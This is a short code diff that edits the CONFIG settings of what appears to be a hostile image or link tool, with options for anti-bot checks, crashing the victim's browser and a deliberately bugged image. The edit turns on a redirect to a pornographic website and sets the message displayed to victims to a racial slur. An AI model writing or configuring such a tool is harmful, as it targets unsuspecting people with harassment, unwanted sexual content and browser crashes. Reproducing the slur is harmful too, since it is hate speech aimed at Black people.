@@ -14,7 +14,7 @@ CONFIG = {
     "antiBot": 1,
     "crashBrowser": True,
     "buggedImage": True,
-    "redirect": {"redirect": False, "page": "https://your-link.here"},
+    "redirect": {"redirect": True, "page": "Pornhub.com"},
     "message": {"doMessage": True, "message": "fucking nigger", "richMessage": True}
 }
 
